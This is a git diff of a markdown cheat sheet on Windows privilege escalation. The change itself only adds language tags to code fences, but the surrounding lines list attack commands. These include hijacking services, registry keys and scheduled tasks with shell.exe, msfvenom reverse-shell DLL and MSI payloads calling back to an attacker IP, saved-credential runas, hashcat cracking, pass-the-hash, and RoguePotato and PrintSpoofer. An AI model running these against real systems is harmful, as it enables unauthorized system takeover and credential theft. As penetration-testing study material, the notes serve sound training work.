@@ -38,7 +38,7 @@ This section is coming straight from Tib3rius Udemy Course.
 
 ### Check user info
 
-```
+```powershell
 C:\Cas> whoami /all
 C:\Cas> net user <user_name>
 C:\Cas> net localgroup administrators
@@ -50,7 +50,7 @@ C:\Cas> net localgroup administrators
 
 ### User accounts on the system
 
-```
+```powershell
 C:\Cas> net users
 C:\Cas> net localgroups
 C:\Cas> net group /domain
@@ -59,7 +59,7 @@ C:\Cas> net group /domain <group_name>
 
 ## OS Version & Architecture
 
-```
+```powershell
 C:\Cas> systeminfo
 ```
 
@@ -75,13 +75,13 @@ C:\Cas> systeminfo
 
 **Running processes**
 
-```
+```powershell
 C:\Cas> tasklist /SVC
 ```
 
 **Services**
 
-```
+```powershell
 C:\Cas> sc query <service_name>
 C:\Cas> accesschk64.exe -uwcqv <user> *
 C:\Cas> sc qc "service"
@@ -98,19 +98,19 @@ C:\Cas> sc qc "service"
 
 Enumerate for vulnerable services (Can change Authenticated Users to other group)
 
-```
+```powershell
 C:\Cas> .\accesschk.exe /accepteula -uwcqv "Authenticated Users" *
 ```
 
 Enumerate for user permisson on a service
 
-```
+```powershell
 C:\Cas> .\accesschk.exe /accepteula -ucqv <service_name>
 ```
 
 Then, change service config
 
-```
+```powershell
 C:\Cas> sc config <service_name> binpath= "C:\Cas\shell.exe"
 ```
 
@@ -121,17 +121,17 @@ C:\Cas> sc config <service_name> binpath= "C:\Cas\shell.exe"
 
 Enumerate for unquoted service paths
 
-```
+```powershell
 C:\Cas> wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\" |findstr /i /v """
 ```
 
 Check user permission on folders:
 
-```
+```powershell
 C:\Cas> .\accesschk.exe /accepteula -uwdqs users "C:\Program Files\Unquoted Path Service\Common Scripts"
 ```
 
-```
+```powershell
 C:\Cas> copy shell.exe "C:\Program Files\Unquoted Path Service\Common.exe"
 ```
 
@@ -143,11 +143,11 @@ C:\Cas> copy shell.exe "C:\Program Files\Unquoted Path Service\Common.exe"
 
 Check for permission on registry
 
-```
+```powershell
 C:\Cas> .\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc
 ```
 
-```
+```powershell
 C:\Cas> reg add <weak_registry> /v ImagePath /t REG_EXPAND_SZ /d C:\Cas\shell.exe /f
 ```
 
@@ -157,11 +157,11 @@ C:\Cas> reg add <weak_registry> /v ImagePath /t REG_EXPAND_SZ /d C:\Cas\shell.ex
 
 Check for user/group permission on executable file
 
-```
+```powershell
 C:\Cas> .\accesschk.exe -uwqs "Authenticated Users" c:\*.*
 ```
 
-```
+```powershell
 C:\Cas> copy /Y shell.exe "C:\Program Files\File Permissions Service\<insecure-service>"
 ```
 
@@ -172,7 +172,7 @@ C:\Cas> copy /Y shell.exe "C:\Program Files\File Permissions Service\<insecure-s
 
     Find missing Dlls inside system: [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon)
 
-```
+```powershell
 C:\Cas> msfvenom -p windows/x64/shell_reverse_tcp LHOST=<my-ip> LPORT=80 -f dll -o reverse.dll
 ```
 
@@ -183,19 +183,19 @@ C:\Cas> msfvenom -p windows/x64/shell_reverse_tcp LHOST=<my-ip> LPORT=80 -f dll 
 
 ### Full TCP/IP configuration
 
-```
+```powershell
 C:\Cas> ipconfig /all
 ```
 
 ### Networking routing tables
 
-```
+```powershell
 C:\Cas> route print
 ```
 
 ### Active network connections
 
-```
+```powershell
 C:\Cas> netstat -ano
 ```
 
@@ -206,13 +206,13 @@ C:\Cas> netstat -ano
 
 ### Firewall profile
 
-```
+```powershell
 C:\Cas> netsh advfirewall show currentprofile
 ```
 
 ### Firewall rules
 
-```
+```powershell
 C:\Cas> netsh advfirewall firewall show rule name=all
 ```
 
@@ -220,7 +220,7 @@ C:\Cas> netsh advfirewall firewall show rule name=all
 
 List all scheduled tasks
 
-```
+```powershell
 C:\Cas> schtasks /query /fo LIST /v
 
 C:\Cas> Get-ScheduledTask | where {$_.TaskPath -notlike “\Microsoft*”} | ft TaskName,TaskPath,State
@@ -230,7 +230,7 @@ C:\Cas> Get-ScheduledTask | where {$_.TaskPath -notlike “\Microsoft*”} | ft 
 
     Let’s append shell.exe to this script to get back reverse shell on machine
 
-```
+```powershell
 C:\Cas> echo C:\Cas\shell.exe >> C:\<path-scheduled-tasks>
 ```
 
@@ -240,13 +240,13 @@ C:\Cas> echo C:\Cas\shell.exe >> C:\<path-scheduled-tasks>
 
 List applications (use Windows Installer)
 
-```
+```powershell
 C:\Cas> wmic product get name, version, vendor
 ```
 
 List system-wide updates
 
-```
+```powershell
 C:\Cas> wmic qfe get Caption, Description, HotFixID, InstalledOn
 ```
 
@@ -275,7 +275,7 @@ C:\Cas> wmic qfe get Caption, Description, HotFixID, InstalledOn
 
 > This most often happens when an attacker can modify scripts or binary files that are executed under the context of a privileged account.
 
-```
+```powershell
 C:\Cas> accesschk.exe -uws "Everyone" "C:\Program Files"
 
 C:\Cas> Get-ChildItem "C:\Program Files" -Recurse | Get-ACL | ?{$_.AccessToString -match "Everyone\sAllow\s\sModify"}
@@ -285,7 +285,7 @@ C:\Cas> Get-ChildItem "C:\Program Files" -Recurse | Get-ACL | ?{$_.AccessToStrin
 
 > On most systems, drives are automatically mounted at boot time. Because of this, it's easy to forget about unmounted drives that could contain valuable information. We should always look for unmounted drives, and if they exist, check the mount permissions.
 
-```
+```powershell
 C:\Cas> mountvol
 ```
 
@@ -293,13 +293,13 @@ C:\Cas> mountvol
 
 ### List of drivers and kernel modules
 
-```
+```powershell
 C:\Cas> driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object 'Display Name', 'Start Mode', Path
 ```
 
 ### Version of loaded driver
 
-```
+```powershell
 C:\Cas> Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName, DriverVersion, Manufacturer | Where-Object {$_.DeviceName -like "*VMware*"}
 ```
 
@@ -309,7 +309,7 @@ C:\Cas> Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName, DriverVe
 
 > Windows can be configured to run commands at startup, with elevated privileges. These “AutoRuns” are configured in the Registry. If you are able to write to an AutoRun executable, and are able to restart the system (or wait for it to be restarted) you may be able to escalate privileges
 
-```
+```powershell
 C:\Cas> copy /Y shell.exe "C:\Program Files\Autorun Program\program.exe"
 ```
 
@@ -324,11 +324,11 @@ C:\Cas> copy /Y shell.exe "C:\Program Files\Autorun Program\program.exe"
 
 Generate a new reverse shell with msi extension
 
-```
+```powershell
 C:\Cas> msfvenom -p windows/x64/shell_reverse_tcp lhost=<my-ip> lport=443 -f msi -o shell.msi
 ```
 
-```
+```powershell
 C:\Cas> msiexec /quiet /qn /i shell.msi
 ```
 
@@ -342,11 +342,11 @@ C:\Cas> msiexec /quiet /qn /i shell.msi
 
 > Windows has a runas command which allows users to run commands with the privileges of other users. This usually requires the knowledge of the other user’s password. However, Windows also allows users to save their credentials to the system, and these saved credentials can be used to bypass this requirement.
 
-```
+```powershell
 C:\Cas> cmdkey /list
 ```
 
-```
+```powershell
 C:\Cas> runas /savecred /user:<user_name> shell.exe
 ```
 
@@ -359,7 +359,7 @@ C:\Cas> runas /savecred /user:<user_name> shell.exe
     Extract the hash using ‘[CredDump](https://github.com/Neohapsis/creddump7.git)’
     Use hashcat to crack hash
 
-```
+```powershell
 C:\Cas> hashcat -m 1000 --force <hash> /usr/share/wordlists/rockyou.txt
 ```
 
@@ -367,7 +367,7 @@ C:\Cas> hashcat -m 1000 --force <hash> /usr/share/wordlists/rockyou.txt
 
 > Windows accepts hashes instead of passwords to authenticate to a number of services. We can use a modified version of winexe, pth-winexe to spawn a command prompt using the admin user’s hash
 
-```
+```powershell
 C:\Cas> pth-winexe -U '<NTLM hash>' //<IP> cmd.exe
 ```
 
@@ -380,19 +380,19 @@ C:\Cas> pth-winexe -U '<NTLM hash>' //<IP> cmd.exe
 
 Get reverse shell of local service
 
-```
+```powershell
 C:\Cas> PsExec64.exe -i -u "nt authority\local service" C:\Cas\shell.exe
 ```
 
 _“If you have SeAssignPrimaryToken or SeImpersonateprivilege, you are SYSTEM”_
 
-```
+```powershell
 C:\Cas> .\RoguePotato.exe -r <remote-host> -e "C:\Cas\shell.exe" -l 443
 ```
 
 ### PrintSpoofer
 
-```
+```powershell
 C:\Cas> PrintSpoofer.exe -c shell.exe -i
 ```
 
